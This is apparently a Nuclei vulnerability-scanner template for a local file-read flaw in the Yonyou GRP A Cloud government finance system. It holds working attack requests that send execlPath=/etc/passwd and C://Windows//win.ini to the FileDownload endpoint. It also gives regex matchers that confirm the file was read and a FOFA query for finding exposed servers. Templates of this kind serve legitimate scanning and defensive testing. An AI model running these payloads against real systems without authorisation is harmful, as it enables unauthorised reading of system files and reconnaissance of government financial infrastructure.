id: yonyou-grp-a-cloud-FileDownload-lfi-0
info:
  name: 用友 GRP A Cloud 政府财务云系统 FileDownload - fileread
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8B%E6%94%BF%E5%8A%A1%E8%B4%A2%E5%8A%A1%E7%B3%BB%E7%BB%9FFileDownload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
  metadata:
    verified: true
    fofa-query: app="用友-政务财务系统" || body="/pf/portal/login/css/fonts/style.css"
  tags: yonyou,lfi,oa,grpacloud


http:
  - method: GET
    path:
      - "{{BaseURL}}/bg/attach/FileDownload?execlPath=C://Windows//win.ini"
      - "{{BaseURL}}/bg/attach/FileDownload?execlPath=/etc/passwd"

    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or